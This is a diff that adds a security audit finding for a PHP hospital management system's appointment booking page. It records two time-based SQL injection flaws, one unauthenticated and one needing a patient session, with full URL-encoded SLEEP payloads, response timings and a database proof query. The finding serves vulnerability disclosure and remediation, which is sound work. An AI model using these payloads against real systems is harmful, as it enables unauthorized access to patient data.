@@ -1,0 +1,33 @@
+HMS-07: SQLi in appointment booking (duplicate-check SELECT L42 + INSERT L45, admin-panel.php)
+Entry: POST /admin-panel.php (app-submit=1)
+
+[Correction vs audit] L27-33 overwrite POST fname/lname/gender/contact/email with
+$_SESSION values; only doctor/docFees/appdate/apptime are POST-controlled.
+Unauthenticated, $pid is empty -> INSERT reads values(,'','',...) -> SQL syntax error ->
+uncaught mysqli_sql_exception -> HTTP 500 (observed 0.033s; server log shows the
+"near ','','','...' parse error). So the INSERT sink requires a patient session
+(obtainable for free via HMS-04); the L42 SELECT sink is injectable unauthenticated.
+
+[1] Unauthenticated time-based SQLi, duplicate-check SELECT (sink 1, L42)
+    payload: POST /admin-panel.php app-submit=1&...&doctor=Ganesh&docFees=550
+             &appdate=2027-01-03&apptime=x%27%20OR%20%28SELECT%20858%29%3E%28SELECT%20SLEEP%281%29%29--%20-
+             (decodes to apptime = x' OR (SELECT 858)>(SELECT SLEEP(1))-- -)
+             -> HTTP 200 in 18.257s (17 appointmenttb rows x SLEEP(1))
+    Note: quoted-arithmetic const-expr payloads (doctor='x'+(SELECT SLEEP(1))+'y') do NOT
+    delay here: in SELECT-WHERE the AND-form short-circuits (false first operand means the
+    SLEEP operand is never evaluated); in INSERT-VALUES strict mode 'x'+... raises error
+    1292 (truncated DOUBLE) and aborts. OR-form in the last predicate is the reliable
+    time oracle on MySQL 8.0.39.
+
+[2] Time-based INSERT SQLi (sink 2, L45) with patient session (pid=1 from HMS-04)
+    baseline: same POST, docFees=550
+              -> HTTP 200 in 0.123s, row inserted normally
+    payload:  POST /admin-panel.php app-submit=1&fname=x&lname=y&gender=m&email=x@y.z
+              &contact=999&doctor=Ganesh&docFees=1%27%2B%28SELECT%20SLEEP%282%29%29%2B%271
+              &appdate=2027-04-03&apptime=10%3A00
+              (decodes to docFees = 1'+(SELECT SLEEP(2))+'1 -> '1'+0+'1' = 2; numeric
+              string operands avoid the strict-mode 1292 cast error)
+              -> HTTP 200 in 2.117s
+    DB proof: SELECT ID,fname,docFees,appdate FROM appointmenttb WHERE appdate='2027-04-03'
+              -> 19 | <REDACTED> | 2 | 2027-04-03   (docFees column stores the evaluated
+                                              expression result 2; fname comes from session - the seeded patient's first name, redacted)
